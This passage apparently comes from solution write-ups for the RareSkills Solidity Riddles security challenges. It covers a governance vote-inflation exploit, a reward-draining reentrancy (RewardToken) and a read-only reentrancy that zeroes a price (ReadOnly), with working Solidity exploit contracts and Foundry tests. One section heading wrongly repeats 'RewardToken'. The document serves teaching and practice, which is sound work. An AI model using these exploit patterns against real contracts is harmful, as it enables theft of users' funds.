- The `OligarchyNFT` cannot be transferred.
- `appointViceroy` must be called by the owner of the NFT, the viceroy can only be an EOA.
- `deposeViceroy`` can only be called by the oligarch who appointed the viceroy.
- `approveVoter` can only be called by the viceroy, the voter cannot be the viceroy, and the voter must be an EOA.
- `createProposal` can only be called by the viceroy or voter, both of which must be EOAs.
- `voteOnProposal` can only be called by a voter, who must be an EOA.
- Each address can only vote once, no matter which proposal its voting for.

These rules imply that if we creating attacking contracts, any calls to `Governance` must be done in the constructor, so that `address.code.length == 0` since the contract does not have code size during deployment. This will by pass the EOA checks for appoiting the `viceroy` and voters in `approvedVoter`.

The main vulnerability in `Governance` is how `delete` is used with the `Appointment` struct containing a mapping which is a dynamic datatype. In Solidity, deleting structs that contain dynamic datatypes does not delete the dynamic data. The delete keyword only deletes one storage slot, if the slot contains refs to other slots, those wont be deleted. So in `delete viceroys[viceroy]`, this will only reset `appointedBy` and `numAppointments` to default values, but `approvedVoter` will remain unchanged for the associated viceroy address. So when calling `disapproveVoter`, `numAppointments` gets reduced, but nothing happens to `approvedVoter`, so the viceroy can repeatedly approve-disapprove-approve voters such that the number of approved voters under the viceroy exceeds the intended limit of only 5 per viceroy.

The other challenge in this exploit is really using `Create2` to precompute the attacking contracts' addresses so that we can know their addresses before deploying them, and trick `Governance` into thinking they are EOAs since their code size will be zero before they are actually deployed. There are three attacking contracts: `ExploitMain`, `ExploitVicerorEOA`, `ExploitVoterEOA`, and a library `Create2Sample` that is used to precompute the attacking contracts' addresses.

In `ExploitMain`, when `exploit` is called, `ExploitViceroyEOA`'s address will be precomputed, and the function will call `Governance.appointViceroy` to set this address as the viceroy. This call will pass since the address is a precompute so there is no code at the address. Then we can deploy `ExploitViceroy` using Create2: `{salt: bytes32(uint256(99))}`, with this same salt we used to generate the `viceroyPrecomputeAddress` [Note that this syntax is the new way to invoke create2 w/o assembly].

In `ExploitViceroyEOA`, we interact with `Goverance` in the constructor only so that our attack gets called on the contract's deployment in `exploit`. The proposal to send funds to `attackerWallet` is created: `abi.encodeWithSignature("exec(address,bytes,uint256)", attackerWallet, "", 10 ether);`, so that when the proposal has enough votes, `executeProposal` will execute a low-level `call` to `CommunityWallet` with the data to call `exec` and send funds to `attackerWallet`. Then in a for loop for 10 voters, we precompute each `ExploitVoterEOA`'s address and call `Governance.approveVoter` to approve each voter. This call will pass since each voter's address is only a precompute so there is no code at the address. Then we deploy each `ExploitVoterEOA` using Create2 with the same salt (`{salt: bytes32(uint256(i))}`) we used to generate `voterPrecomputeAddress`.

While still in the for loop, every time one voter contract is deployed, each `ExploitVoterEOA`'s constructor will contain code to call `Governance.voteOnProposal`, and the proposal will receive 1 vote during each iteration. After the voter contract is deployed, we can simply call `Governance.disapproveVoter(voterPrecomputeAddress)` to exploit the `delete` bug, and allow `ExploitViceroyEOA` to have more than 5 approved voters. By the end of the for loop, the viceroy will have 10 approved voters, and the proposal would have received 10 votes. `ExploitViceroy` then calls `Governance.executeProposal` at the end of the contructor to execute the call to transfer funds to `attackerWallet`.

## RareSkills Solidity Riddles: RewardToken
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/RewardToken.sol

### Contracts
- `src/Week10-11/RewardToken.sol`
```
contract RewardToken is ERC20Capped {
    constructor(address depositoor) ERC20("Token", "TK") ERC20Capped(1000e18) {
        // becuz capped is funny https://forum.openzeppelin.com/t/erc20capped-immutable-variables-cannot-be-read-during-contract-creation-time/6174/4
        ERC20._mint(depositoor, 100e18);
    }
}

contract NftToStake is ERC721 {
    constructor(address attacker) ERC721("NFT", "NFT") {
        _mint(attacker, 42);
    }
}

contract Depositoor is IERC721Receiver {
    IERC721 public nft;
    IERC20 public rewardToken;
    uint256 public constant REWARD_RATE = 10e18 / uint256(1 days);
    bool init;

    constructor(IERC721 _nft) {
        nft = _nft;
        alreadyUsed[0] = true;
    }

    struct Stake {
        uint256 depositTime;
        uint256 tokenId;
    }

    mapping(uint256 => bool) public alreadyUsed;
    mapping(address => Stake) public stakes;

    function setRewardToken(IERC20 _rewardToken) external {
        require(!init);
        init = true;
        rewardToken = _rewardToken;
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    )
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(nft), "wrong NFT");
        require(!alreadyUsed[tokenId], "can only stake once");

        alreadyUsed[tokenId] = true;
        stakes[from] = Stake({depositTime: block.timestamp, tokenId: tokenId});

        return IERC721Receiver.onERC721Received.selector;
    }

    function claimEarnings(uint256 _tokenId) public {
        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
        payout(msg.sender);
        stakes[msg.sender].depositTime = block.timestamp;
    }

    function withdrawAndClaimEarnings(uint256 _tokenId) public {
        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
        payout(msg.sender);
        nft.safeTransferFrom(address(this), msg.sender, _tokenId);
        delete stakes[msg.sender];
    }

    function payout(address _a) private {
        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;

        if (amountToSend > 50e18) {
            amountToSend = 50e18;
        }
        if (amountToSend > rewardToken.balanceOf(address(this))) {
            amountToSend = rewardToken.balanceOf(address(this));
        }

        rewardToken.transfer(_a, amountToSend);
    }
}

contract Exploit is IERC721Receiver {
    Depositoor public depositoor;

    function stakeNFT(uint256 tokenId, NftToStake _nft, Depositoor _depositoor) public {
        _nft.safeTransferFrom(address(this), address(_depositoor), tokenId);
    }

    function exploit(uint256 tokenId, Depositoor _depositoor) public {
        //withdraw NFT calls onERC721Received, which we can use to reenter and attack
        //since `delete stakes[msg.sender]` is only called after the safeTransferFrom
        depositoor = _depositoor;
        depositoor.withdrawAndClaimEarnings(tokenId);
    }

    function onERC721Received(
        address,
        address, /*from*/
        uint256 tokenId,
        bytes calldata
    )
        external
        override
        returns (bytes4)
    {
        depositoor.claimEarnings(tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
- `test/Week10-11/RewardToken.t.sol`
```
contract RewardTokenTest is Test {
    address attackerWallet;
    RewardToken rewardTokenContract;
    NftToStake nftToStakeContract;
    Depositoor depositoorContract;
    Exploit exploitContract;

    function setUp() public {
        attackerWallet = address(0xbad);
        exploitContract = new Exploit();
        nftToStakeContract = new NftToStake(address(exploitContract));
        depositoorContract = new Depositoor(nftToStakeContract);
        rewardTokenContract = new RewardToken(address(depositoorContract));

        depositoorContract.setRewardToken(rewardTokenContract);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.stakeNFT(42, nftToStakeContract, depositoorContract);

        //forward 10 days so in `payout` rewards is 100 ether
        vm.warp(10 days);
        exploitContract.exploit(42, depositoorContract);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(rewardTokenContract.balanceOf(address(exploitContract)), 100 ether);
        assertEq(rewardTokenContract.balanceOf(address(depositoorContract)), 0);
    }
}
```

### Exploit
The vulnerability is in the `withdrawAndClaimEarnings` function, where `delete stakes[msg.sender]` is executed only after the NFT `safeTransferFrom`. When `Exploit` stakes into `Depositoor` and then calls `withdrawAndClaimEarnings`, a `safeTransferFrom` will be called and the `onERC721Received` hook in `Exploit` will be called. Since `delete stakes[msg.sender]` hasn't been executed when control has been handed over to `Exploit`, `Exploit` can reenter `Depositoor` and call `claimEarnings` as its stake will still be present in the `stakes` mapping.

`Depositoor` prevents anyone from claiming more than half the supply in the contract, which means the maximum claimable is only 50 ether. So for the exploit to work, after calling `Exploit.stakeNFT`, we wait for 10 days so that the amount owed is techinically 100 ether. And when we call `Exploit.exploit` the cross-function reentracy will allow `Exploit` to claim twice, effectively draining `Depositoor`.

## RareSkills Solidity Riddles: RewardToken
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/ReadOnly.sol

### Contracts
- `src/Week10-11/ReadOnly.sol`
```
contract VulnerableDeFiContract {
    ReadOnlyPool private pool;
    uint256 public lpTokenPrice;

    constructor(ReadOnlyPool _pool) {
        pool = _pool;
    }

    // @notice since getVirtualPrice is always correct, anyone can call it
    function snapshotPrice() external {
        lpTokenPrice = pool.getVirtualPrice();
    }
}

contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
    //IERC20[] public acceptedTokens;
    mapping(address => bool) acceptedTokens;
    mapping(address => uint256) originalStake;

    // @notice deposit eth and get back the same amount of LPTokens for later redemption
    function addLiquidity() external payable nonReentrant {
        originalStake[msg.sender] += msg.value;
        _mint(msg.sender, msg.value);
    }

    // @notice burn LPTokens and get back the original deposit of ETH + profits
    function removeLiquidity() external nonReentrant {
        uint256 numLPTokens = balanceOf(msg.sender);
        uint256 totalLPTokens = totalSupply();
        uint256 ethToReturn = (originalStake[msg.sender] * (numLPTokens + totalLPTokens)) / totalLPTokens;

        originalStake[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: ethToReturn}("");
        require(ok, "eth transfer failed");

        _burn(msg.sender, numLPTokens);
    }

    /*
     * @notice virtualPrice is the ETH in the contract divided by the total LP tokens.
     *         As more tokens are earned by the pool, the liquidity tokens are worth
     *         more because they can redeem the same size of a larger pool.
     * @dev there is always at least as much
     */

    function getVirtualPrice() external view returns (uint256 virtualPrice) {
        virtualPrice = address(this).balance / totalSupply();
    }

    // @notice earn profits for the pool
    function earnProfit() external payable {}
}

contract Exploit {
    ReadOnlyPool public readOnlyPool;
    VulnerableDeFiContract public vulnerableDeFiContract;

    constructor(ReadOnlyPool _readOnlyPool, VulnerableDeFiContract _vulnerableDeFiContract) {
        readOnlyPool = _readOnlyPool;
        vulnerableDeFiContract = _vulnerableDeFiContract;
    }

    function exploit() public payable {
        readOnlyPool.addLiquidity{value: msg.value}();
        readOnlyPool.removeLiquidity();
    }

    receive() external payable {
        vulnerableDeFiContract.snapshotPrice();
    }
}
```
- `src/Week10-11/ReadOnly.t.sol`
```
contract ReadOnlyTest is Test {
    address attackerWallet;
    VulnerableDeFiContract vulnerableDeFiContract;
    ReadOnlyPool readOnlyPoolContract;
    Exploit exploitContract;

    function setUp() public {
        attackerWallet = address(0xbadbad);
        readOnlyPoolContract = new ReadOnlyPool();
        vulnerableDeFiContract = new VulnerableDeFiContract(readOnlyPoolContract);
        exploitContract = new Exploit(readOnlyPoolContract, vulnerableDeFiContract);

        readOnlyPoolContract.addLiquidity{value: 100 ether}();
        readOnlyPoolContract.earnProfit{value: 1 ether}();
        vulnerableDeFiContract.snapshotPrice();

        //Player starts with 2 ETH
        vm.deal(attackerWallet, 2 ether);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.exploit{value: 2 ether}();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(vulnerableDeFiContract.lpTokenPrice(), 0);
    }
}
```

### Exploit
In this exploit, the goal is to set the `lpTokenPrice` in `VulnerableDeFiContract` to zero. The `lpTokenPrice` is retrieved when `snapshotPrice` (which calls the function `getVirtualPrice` in `ReadOnlyPool`) is called, and the goal is to somehow make `address(this).balance` less than the `totalSupply` during the call.

The vulnerability lies in the `removeLiquidity` function in `ReadOnlyPool`. In the function, a `call` is made to send ether back to `msg.sender` before the `_burn` function is executed. This means that an exploiter with a malicious `receive` function can call `VulnerableDeFiContract.snapshotPrice` to manipulate `lpTokenPrice` before `removeLiquidity` completes its operations; that is, the value of `lpTokenPrice` will be calculated with a reduced ether balance and an unchanged total supply of shares (LP tokens). In `virtualPrice = address(this).balance / totalSupply();`, if `totalSupply` is more than the balance, it will return `0`.

Thus in `Exploit`, the `exploit` function calls `addLiquidity` to deposit into `ReadOnlyPool`. And then calls `removeLiquidity`. While `removeLiquidity` transfers ether to `Exploit`, `Exploit`'s receive function will call `vulnerableDeFiContract.snapshotPrice()` to update the value of `lpTokenPrice` with reduced ether and unchanged total supply, resulting in `lpTokenPrice == 0`.